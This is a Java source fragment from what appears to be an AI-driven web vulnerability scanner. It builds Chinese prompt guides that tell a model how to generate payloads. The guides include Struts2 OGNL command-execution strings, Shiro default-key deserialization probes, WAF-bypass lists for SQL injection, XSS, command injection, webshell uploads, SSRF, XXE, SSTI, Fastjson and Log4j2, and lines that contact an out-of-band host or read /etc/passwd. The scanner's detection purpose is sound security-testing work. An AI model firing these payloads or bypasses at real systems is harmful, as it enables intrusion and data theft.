                return "Struts2 payload（OGNL 表达式；position 决定命中哪条漏洞：header:Content-Type 命中 S2-045/046，参数值命中 S2-059/061/062，BODY 用于 S2-069 的 XXE）：1. S2-045/S2-046（CVE-2017-5638，Content-Type 里的 OGNL）：position=header:Content-Type，载荷 %{(#context['xwork.MethodAccessor.denyMethodExecution']=false)(#_memberAccess['allowStaticMethodAccess']=true)(@java.lang.Runtime@getRuntime().exec('nslookup oob.invalid'))} 2. S2-059/S2-061（CVE-2019-0230 / CVE-2020-17530，参数里的 OGNL，影响 2.0.0~2.5.29 与 6.0.0~6.0.4）：position=参数名，载荷同上（%{...} 包裹） 2b. **S2-062（CVE-2021-31805）形态不同、别套 %{}**：它的漏洞点在**标签的 name=\"%{...}\" 属性**上（同一标签不带 value 属性时才会二次求值），那一层 %{} 由标签提供，所以参数里要填**裸表达式**：@java.net.InetAddress@getByName('oob.invalid')（纯 Java 解析，不依赖目标上有没有 nslookup/curl/getent）或 (#p=new java.lang.ProcessBuilder(new java.lang.String[]{'getent','hosts','oob.invalid'})).(#p.start())；被 OGNL 沙箱拦住时走 BeanMap 路线——用 (#request.get('struts.valueStack')) 取 ValueStack、把 memberAccess 的 excludedClasses/excludedPackageNames 置空后再调用（完整链见公开 PoC 的 #@org.apache.commons.collections.BeanMap@{} 写法） 3. 静态方法被沙箱挡住时改用实例化写法：%{(#p=new java.lang.ProcessBuilder(new java.lang.String[]{'nslookup','oob.invalid'})).(#process=#p.start())} 4. 只求值不执行（**Struts2 最可靠的证据，成对给出**）：%{100*100} 与 %{100*200} —— 响应里出现 10000 / 20000 即证明表达式被求值（求值结果**常在标签属性里**，如 <a id=\"10000\">；有些演示环境同时把原始输入回显到页面，如 your input id: %{100*100}，那是回显、不是求值结果，别被它带偏）；%{@java.lang.Math@abs(-1)} 可作辅助 5. S2-069（CVE-2025-68493，2026-01 披露，2.0.0~6.1.0 的 XML 校验缺失导致 XXE）：position=BODY，载荷 <?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"http://oob.invalid/x.dtd\">%xxe;]><root>test</root> 6. S2-057（CVE-2018-11776）需要把 OGNL 放进 URL 路径/namespace：position 用 URL_PATH（路径确实有可求值的段时才用，如 /struts2-showcase/action），载荷同第 1 条的 %{...} 形态 7. 判定：回连记录里出现我们的域名 = OGNL 被求值或外部实体被解析；Struts 报错页、404/500 都不算 注意：不要用 S2-068（CVE-2025-64775，multipart 磁盘耗尽）这类 DoS 载荷，也不要执行写文件、删文件命令";
            case SHIRO:
                return "Shiro payload（rememberMe cookie 反序列化；position 优先填请求里真实存在的 cookie 参数 rememberMe，没有就填 header:Cookie）：1. 存在性探测（不需要密钥）：position 是真实 cookie 参数时给 probe、deleteMe；position 是 header:Cookie 时给 rememberMe=probe、rememberMe=deleteMe —— 响应里出现 Set-Cookie: rememberMe=deleteMe 说明目标用了 Shiro 且解密逻辑被触发，攻击面存在（但还不能证明可利用）2. Shiro-550（CVE-2016-4437，默认/硬编码 AES 密钥 + 反序列化）：载荷里只写标记 {{SHIRO_URLLDNS:<密钥>}}，程序会用该密钥把 URLDNS gadget 加密成真正的 cookie 值，gadget 只触发一次对我们域名的 DNS 解析、不执行任何代码，有回连记录即证明「密钥正确 + 反序列化被执行」。**标记形态必须与 position 对应**：position 是真实 cookie 参数 rememberMe → 裸标记 {{SHIRO_URLLDNS:kPH+bIxk5D2deZiIxcaaaA==}}（程序只替换该参数的值）；position 是 header:Cookie → 必须带 cookie 名 rememberMe={{SHIRO_URLLDNS:kPH+bIxk5D2deZiIxcaaaA==}}。写成裸标记却填 header:Cookie，注入出来的是 Cookie: <一长串 base64>，目标根本不会去解密 —— 必然漏报。每条载荷换一个密钥：{{SHIRO_URLLDNS:kPH+bIxk5D2deZiIxcaaaA==}}、{{SHIRO_URLLDNS:2AvVhdsgUs0FSA3SDFAdag==}}、{{SHIRO_URLLDNS:3AvVhmFLUs0KTA3Kprsdag==}}、{{SHIRO_URLLDNS:4AvVhmFLUs0KTA3Kprsdag==}}、{{SHIRO_URLLDNS:5aaC5qKm5oqA5pyvAAAAAA==}}、{{SHIRO_URLLDNS:6ZmI6I2j5Y+R5aSn5ZOlAA==}}、{{SHIRO_URLLDNS:bWljcm9zAAAAAAAAAAAAAA==}}、{{SHIRO_URLLDNS:wGiHplamyXlVB11UXWol8g==}}、{{SHIRO_URLLDNS:Z3VucwAAAAAAAAAAAAAAAA==}}、{{SHIRO_URLLDNS:fCq+/xW488hMTCD+cmJ3aQ==}}、{{SHIRO_URLLDNS:1QWLxg+NYmxraMoxAXu/Iw==}}、{{SHIRO_URLLDNS:ZUdsaGJuSmxibVI2ZHc9PQ==}} 3. 密钥猜中后的进一步利用（本工具不做）：换成 CommonsCollections/JRMPClient 链需要自建恶意 JRMP 服务 4. Shiro-721（CVE-2019-12422）需要合法 cookie 加 padding oracle，属于多请求攻击，本工具不做 5. 2025-2026 相关（判定与修复参考）：CVE-2026-56130（rememberMe 无过期校验、cookie 可无限重放）、CVE-2026-56091（shiro-guice 认证绕过）、CVE-2026-43828（Cookie 缺 secure 属性）、CVE-2023-34478（路径穿越）6. 判定：只有 deleteMe 不算漏洞（只说明用了 Shiro），必须有回连记录才算「默认密钥 + 反序列化」可利用";
            default:
                return "生成对应的漏洞类型payload，确保payload简洁无空格";
        }
    }
    
    private String getWafBypassGuideForVulnType(ScanTask.ScanMode mode) {
        if (mode == null) return "";
        switch (mode) {
            case SQL_INJECTION:
                // 示例一律写成**纯值**（不带 id= 这类参数名前缀）：载荷过滤器会把含「本条载荷自己的
                // 参数名=」的载荷整条丢掉（那是为防止模型回显整个参数），而模型照抄示例是常态 ——
                // 参数名恰好叫 id 时（太常见），带前缀的示例会让整个 WAF 绕过维度被静默丢光。
                return "SQL注入WAF绕过：1. 注释替代空格：1/**/OR/**/1=1、1;-- - 2. 大小写混合：SeLeCt、UnIoN、OrDeR By 3. URL编码：%27%20OR%20%271%27=%271 4. 双重URL编码：%2527%2520%254f%2552 5. 宽字节注入：%bf%27 OR 1=1-- - 6. 十六进制：0x72706c 7. HPP参数污染：同一参数提交两次，第二次写成 1 OR 1=1-- - 8. 整数溢出：99999999999999999999 9. NULL字节截断：1%00 10. 关键字拆分：UNIUNION + SELSELECTECT";
            case XSS:
                return "XSS WAF绕过：1. 大小写混合：<ScRiPt>、<ImG>、<SvG> 2. 事件处理器混淆：onerror=改为onERROR=、oNerror 3. HTML编码：&lt;script&gt;、&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62; 4. SVG标签：<svg><script>alert(1)</script> 5. 数据协议：<a href=\"data:text/html,<script>alert(1)</script>\">click</a> 6. 空字节截断：<script%00>alert(1)</script> 7. JavaScript伪协议：<a href=\"javascript:alert(1)\"> 8. 注释混淆：<script>/* */alert(1)/* */</script> 9. 进制转换：String.fromCharCode(97,108,101,114,116) 10. DOM操作：element.innerHTML='<img src=x onerror=alert(1)>'";
            case COMMAND_INJECTION:
                return "命令注入WAF绕过：1. 换行符截断：whoami%0A、cat%0A/etc/passwd 2. URL编码：%3Bwhoami、%26whoami%26 3. 管道组合：;cat /etc/passwd|grep root 4. 反引号嵌套：$(whoami$(whoami)) 5. 环境变量：${IFS}、${PATH} 6. 十六进制编码：0x726f6f74 7. 组合绕过：;ls${IFS}-la 8. 编码混淆：%0awhoami%0a 9. 命令拆分：w%68oami 10. 无回显外带：;nslookup oob.invalid、|nslookup oob.invalid、;curl http://oob.invalid/x（只要目标解析了该域名就算回连成功，不必带回输出）";
            case FILE_UPLOAD:
                // 这一节和第 1~4 条曾经通篇是 .php 写法（shell%2ephp / shell.PhP / shell.php.jpg /
                // shell.php%00.jpg），而主攻指南已经分语言了 —— 于是 4 条绕过载荷全部照着示例
                // 落在 PHP 上，Java/.NET 目标上这 4 条一个都不可能执行，整个「WAF 绕过」维度白测
                // （实测：Flask 靶场一轮 9 条里 6 条指向 PHP，4 条绕过无一例外）。
                // 改法与主攻指南同一套路：先声明示例里的后缀是变量，再在第 1~3 条给出各语言的写法。
                return "文件上传WAF绕过（**下面示例一律用 .php 写法演示，出手前先把后缀换成目标语言的那一个**：Java → .jsp/.jspx、.NET → .aspx/.ashx；没有指纹就 PHP / Java / .NET 各出几条 —— 4 条绕过全落在 .php 上，等于这个维度没测）：\n"
                        + "1. 后缀编码：shell%2ephp、shell.%2ephp、shell%252ephp（双重编码）—— 换语言即 shell%2ejsp、shell%2easpx\n"
                        + "2. 大小写与双写：shell.PhP、shell.PHP5、shell.pphphp（双写：过滤器只删一次后缀时，删完剩下的仍是该后缀 —— jsp 写 shell.jjspsp、aspx 写 shell.aaspxspx）\n"
                        + "3. 双扩展名：shell.php.jpg、shell.php.png、shell.jpg.php —— 换语言即 shell.jsp.jpg、shell.jpg.aspx\n"
                        + "4. 00截断：shell.php%00.jpg（仅老版本 PHP 的 null 字节截断，其它语言打不中，别当通用绕过用）\n"
                        + "5. Content-Disposition 变形：content-disposition 全小写、form-data 后加多余分号或脏数据、filename 写成 file name\n"
                        + "6. MIME 伪造：Content-Type 伪造成白名单里的类型（image/png、image/jpeg、text/plain），或各语言的 MIME（application/x-httpd-php、application/x-jsp、application/octet-stream），另可试双 Content-Type 头\n"
                        + "7. 配置文件覆盖：PHP/Apache → .htaccess（SetHandler）、.user.ini（auto_prepend_file=shell.jpg）；.NET/IIS → web.config（handlers 把 .jpg 当 aspx 执行）\n"
                        + "8. 尾部字符与系统特性：shell.php/./、shell.php>>>；分号截断按平台写 shell.asp;.jpg（IIS）或 shell.jsp;.jpg（Tomcat 解析路径时把 ; 之后当路径参数丢掉，服务端先规范化路径再落盘才成立）；shell.php::$DATA 仅限 NTFS\n"
                        + "9. 竞争上传：并发上传同名文件绕过检查\n"
                        + "10. Unicode 与全角：用同形字符替换扩展名里的字母（部分解析器会还原）\n"
                        + "注意：绕过载荷换了后缀，脚本内容也要跟着换（.jsp 配 <% out.println(123); %>、.aspx 配 <%@ Page Language=\"C#\" %><% Response.Write(123); %>）—— 后缀是 Java、内容还是 PHP，一样证明不了可执行；判定口径与主攻载荷相同";
            case SSRF:
                return "SSRF WAF绕过：1. IP十进制：2130706433 (127.0.0.1) 2. localhost变种：127.0.0.1、127.1、0x7f000001、::1 3. @符绕过：http://google.com@127.0.0.1 4. DNS重绑定：http://127.0.0.1.example.com 5. 协议变换：gopher://127.0.0.1:6379/_、dict://127.0.0.1:6379/info 6. IPv6地址：http://[::1]:80、http://[::ffff:127.0.0.1] 7. 编码绕过：http://127%E2%80%A60.0.1 8. 进制转换：http://0xd80363ee、八进制 http://0177.0.0.1 9. 回环别名：http://0/、http://127.0.0.1%09@example.com（%09 是制表符，用百分号写法避免转义歧义） 10. 换成外带域名：http://oob.invalid/（目标只拦内网地址、不拦任意域名时，这条能证明它能带我们出网）";
            case XXE:
                return "XXE WAF绕过：1. 外部实体压缩：<!DOCTYPE foo[<!ENTITY % xxe SYSTEM \"http://oob.invalid/dtd\">>%xxe;]> 2. CDATA包装：<![CDATA[<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]]> 3. 无回显Blind XXE：<!DOCTYPE foo[<!ENTITY % xxe SYSTEM \"http://oob.invalid/?data=%dtds;\">]> 4. XInclude攻击：<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include href=\"file:///etc/passwd\"/></foo> 5. SOAP XML注入：<soap:Body><foo>&xxe;</foo></soap:Body> 6. 实体嵌套：<!DOCTYPE foo[<!ENTITY a \"123\"><!ENTITY b \"&a;456\">]> 7. DTD外部引用：<!DOCTYPE foo SYSTEM \"http://oob.invalid/evil.dtd\"> 8. Base64编码读取：<!ENTITY xxe SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/passwd\">";
            case SSTI:
                return "SSTI WAF绕过：1. 模板语法混淆：{{7*7}}、${7*7}、<%=7*7%>混合使用 2. 过滤绕过：{{config}}改为{{request.environ}} 3. 内联表达式：{{.}}、{{-0-}} 4. 过滤器利用：{{''|attr('__class__')}} 5. 进制转换：{{(1).__class__.__bases__[0].__subclasses__()}} 6. 模板引擎特定payload：Jinja2用{{lipsum}}、Twig用{{_self}} 7. 编码绕过：{{\"\\x7b\\x7b7*7\\x7d\\x7d\"}} 8. 多重嵌套：{{(7*7).__class__.__bases__[0].__subclasses__()}}";
            case FASTJSON:
                return "Fastjson WAF绕过：1. 键名转义：{\"\\u0040type\":\"java.net.Inet4Address\",\"val\":\"oob.invalid\"} 2. 类型名加 L 前缀与分号：{\"@type\":\"Ljava.net.Inet4Address;\"} 3. 数组包裹：[{\"@type\":\"java.net.Inet4Address\",\"val\":\"oob.invalid\"}] 4. 分层嵌套：{\"a\":{\"@type\":\"java.net.Inet4Address\",\"val\":\"oob.invalid\"}} 5. 大小写与空格变体：Java.net.Inet4Address、{ \"@type\" : \"java.net.URL\" } 6. 换用不含 ldap/rmi 关键字的类型：java.net.URL、java.net.Inet4Address 7. 用 jar:http:// 形态（CVE-2026-16723）规避 @type+ldap 的组合特征 8. 把 @type 放到对象末尾（部分 WAF 只看前若干字节）9. 换 Content-Type：text/json、application/*+json、multipart 里塞 JSON part 10. 参数污染：同一个 JSON 字段提交两次，WAF 与后端取的不是同一个";
            case LOG4J2:
                return "Log4j2 WAF绕过：1. 大小写混排：${JNDI:dns://oob.invalid}、${jNdI:ldap://oob.invalid/x} 2. 用 ${lower:}/${upper:}/${::-x} 拼接关键字（见攻击载荷）3. 多层嵌套：${${lower:${lower:j}}ndi:dns://oob.invalid} 4. 用 dns://、iiop:// 替代 ldap://、rmi:// 规避关键字 5. URL 编码后提交：%24%7Bjndi%3Adns%3A%2F%2Foob.invalid%7D（部分应用先解码再记日志）6. JSON 里转义：\\u0024\\u007bjndi:dns://oob.invalid\\u007d 7. 把 payload 分散到多个 header（WAF 只查单个 header 时有效）8. 参数污染：同名参数多次提交，只让其中一个带 payload 9. 拆关键字：${jndi:dn${lower:s}://oob.invalid/x} 10. 组合：${${env:BARFOO:-j}ndi:dns://oob.invalid}";
            case STRUTS2:
                return "Struts2 WAF绕过：1. 用实例化写法替代 @类名@方法（避开 @java.lang.Runtime 特征）：%{(#p=new java.lang.ProcessBuilder(new java.lang.String[]{'nslookup','oob.invalid'})).(#process=#p.start())} 2. 链式 (#a=...).(#b=...) 代替逗号分隔 3. URL 编码与双重编码：%25%7B100%2A100%7D 4. %{ } 与 ${ } 混用（不同版本对两者都求值）5. 用 #attr/#application/#context 取对象，少写类名 6. Content-Type 变形：multipart/form-data 大小写与参数顺序、加引号、尾部多余分号 7. 参数污染：同名参数多值，Struts 取值顺序与 WAF 解析可能不同 8. 类名拆分：@java.lang.Run'+'time@getRuntime() 9. 走 S2-069 的 XML 通道：把 XXE 放进 XML 请求体，完全绕开 OGNL 关键字检测 10. 只用 java.net.URL 做外带，不出现 exec/Runtime 关键字";
            case SHIRO:
                return "Shiro WAF绕过：1. cookie 名大小写：rememberMe / rememberme / REMEMBERME 2. 值里的 Base64 变形：去掉或补齐 = 号、URL 编码 + 与 /、折行 3. 位置变化：放在 Cookie 头的最前或最后，或改用 header:Cookie 整段替换 4. 同名 cookie 提交两次（WAF 与后端取值可能不同）5. 先发一个无效 rememberMe 触发 deleteMe，再发真正的载荷（绕过「首次即拦截」的规则）6. 换提交路径与方法（GET/POST、加不同 URL 前缀）7. cookie 之间插入空格或分号制造解析差异 8. 用 header:Cookie 时把其它会话 cookie 一并带上（避免因缺 cookie 被前置校验拦掉）9. 分块传输或压缩 body（载荷在 header 时作用有限，主要用于整段 Cookie 混淆）10. 组合：改名 + Base64 变形 + 位置调整";
            default:
                return "使用编码、混淆、特殊字符等技术绕过WAF检测，确保payload简洁无空格";
        }
    }

    private String getSafePayloadGuideForVulnType(ScanTask.ScanMode mode) {
        if (mode == null) return "";
        switch (mode) {
            case SQL_INJECTION:
                return "SQL注入探测载荷（每个组合的第1条，它的响应会被插件作为同组合其余载荷的对照，本身不追求触发漏洞）：1. 单引号测试：' (观察响应变化) 2. 逻辑对比：1' AND '1'='1 (恒真)、1' AND '1'='2 (恒假) 3. 无害错误：' OR 'x'='x 4. 基础闭合：' (单引号闭合) 5. 区分大小写测试：' OR 'a'='A 注意：本条只做探测，不要造成数据修改或删除";
            case XSS:
                return "XSS探测载荷（每个组合的第1条，它的响应会被插件作为同组合其余载荷的对照，本身不追求触发漏洞）：1. 纯文本测试：<plaintext>test</plaintext> 2. HTML转义：&lt;script&gt; 3. 空标签：<!-- --><noop>test</noop> 4. 数字无脚本：12345、abcdefg 5. 安全标签：<span>test</span>、<div>test</div> 6. 编码形式：&amp;lt; 注意：本条只做探测，不要把直接触发弹窗的载荷放在这一条";
            case COMMAND_INJECTION:
                return "命令注入探测载荷（每个组合的第1条，它的响应会被插件作为同组合其余载荷的对照，本身不追求触发漏洞）：1. 无输出分隔符：;true、|true、&&true（分隔符被执行、但没有任何输出 —— 响应应当与基线一致，这正是对照要的「什么都没发生」）2. 原值形态：127.0.0.1、localhost 3. 空操作：; : 、| :（Windows 用 & rem）4. 零延迟：;sleep 0 注意：本条只做形态探测，**不要放 id / whoami / echo / ls / pwd 这类会产生输出的命令** —— 它们的实际输出在验证特征里就是本类型的强证据，放进来会让对照自己带上证据（那些属于主攻载荷）；也不要执行任何删除、修改或写入操作";
            case FILE_UPLOAD:
                return "文件上传探测载荷（每个组合的第1条，它的响应会被插件作为同组合其余载荷的对照，本身不追求触发漏洞）：1. 纯文本文件：test.txt 2. 安全图片：1x1像素的PNG/BMP 3. 空文件：empty.txt (0字节) 4. 白名单扩展名：.jpg、.png、.gif 5. 正确MIME：image/png、image/jpeg 6. 小文件：1字节文件测试 注意：本条只上传无害文件，脚本载荷放在主攻载荷里";
            case SSRF:
                return "SSRF探测载荷（每个组合的第1条，它的响应会被插件作为同组合其余载荷的对照，本身不追求触发漏洞）：1. 本机测试：http://127.0.0.1:80、http://localhost 2. 外部合法URL：https://example.com 3. DNS解析测试：http://example.com 4. IP格式测试：http://0.0.0.0 5. IPv6本地：http://[::1] 注意：本条避免访问内网敏感地址";
            case XXE:
                return "XXE探测载荷（每个组合的第1条，它的响应会被插件作为同组合其余载荷的对照，本身不追求触发漏洞）：1. CDATA测试：<![CDATA[test]]> 2. 标准XML头：<?xml version=\"1.0\"?><foo>test</foo> 3. 内部实体：<!DOCTYPE foo[<!ENTITY internal \"test\">]><foo>&internal;</foo> 4. 格式错误XML：<foo>test 5. JSON替代：用JSON格式替代XML测试 6. 普通XML：<?xml version=\"1.0\"?><root><item>test</item></root> 注意：本条不声明外部实体，XXE 载荷放在主攻载荷里";
            case SSTI:
                return "SSTI探测载荷（每个组合的第1条，它的响应会被插件作为同组合其余载荷的对照，本身不追求触发漏洞）：1. 原样文本：plain_probe_text（完全不含模板语法，用来确定这个参数会不会被原样回显）2. 字符串常量：{{'probe'}}、${'probe'}、<%= 'probe' %> 3. 普通变量与未定义名：{{variable}}、{{undefined_name}} 4. 空值：{{null}}、{{\"\"}} 注意：**不要放 {{7*7}}、{{1+1}}、{{ [1,2,3] | length }} 这类会算出值的表达式** —— 求值结果本身就是本类型的强证据，放进来会让对照自己带上证据（那些属于主攻载荷）；本条也不访问 config/self/request 等敏感对象";
            case FASTJSON:
                return "Fastjson 探测载荷（每个组合的第1条，它的响应会被插件作为同组合其余载荷的对照，本身不追求触发漏洞）：1. 普通 JSON：{\"test\":\"probe\"}、{\"a\":1} 2. 未知类型（看报错差异）：{\"@type\":\"com.example.NotExist\"} 3. 无害已知类型：{\"@type\":\"java.lang.String\",\"val\":\"probe\"} 4. 语法残缺对照：{\"a\": 注意：本条不解析外部域名、不出网";
            case LOG4J2:
                return "Log4j2 探测载荷（每个组合的第1条，它的响应会被插件作为同组合其余载荷的对照，本身不追求触发漏洞）：1. 未知 lookup（应原样保留）：${notexist:probe} 2. 纯文本标记：log4j-probe-test 3. 无害内置 lookup：${java:version}、${date:yyyy-MM-dd} 4. 只写关键字不做查找：jndi:probe 注意：本条不触发外带、不访问网络";
            case STRUTS2:
                return "Struts2 探测载荷（每个组合的第1条，它的响应会被插件作为同组合其余载荷的对照，本身不追求触发漏洞）：1. 原样文本：probe-test（不含任何 OGNL 语法，用来确定这个参数会不会被原样回显）2. 引号包裹的常量：%{'probe'}、${'probe'} 3. 空表达式：%{''}、${''} 注意：**不要放 %{100*100}、${100*100}、%{@java.lang.Math@abs(-1)} 这类会被求值的表达式** —— 求值结果（10000 之类）本身就是本类型的强证据，代码会按算术求值规则直接判成漏洞，放进来会让对照自己带上证据（那些属于主攻载荷）；本条也不执行命令、不访问网络";
            case SHIRO:
                return "Shiro 探测载荷（每个组合的第1条，它的响应会被插件作为同组合其余载荷的对照，本身不追求触发漏洞）：1. 无效 rememberMe（不加密、不序列化）：position 是真实 cookie 参数时给 probe、deleteMe；position 是 header:Cookie 时给 rememberMe=probe、rememberMe=deleteMe 2. 非法 base64：position 是真实 cookie 参数时给 !!!；header:Cookie 时给 rememberMe=!!! 3. 空值 4. 观察响应头是否回写 rememberMe=deleteMe，以此确认目标用了 Shiro 注意：本条不使用任何密钥、不反序列化任何东西；形态要和 position 对应（见载荷规则第 2 条）";
            default:
                return "生成对应的探测载荷，确保不会对目标造成任何实际影响";
        }
    }
    

}
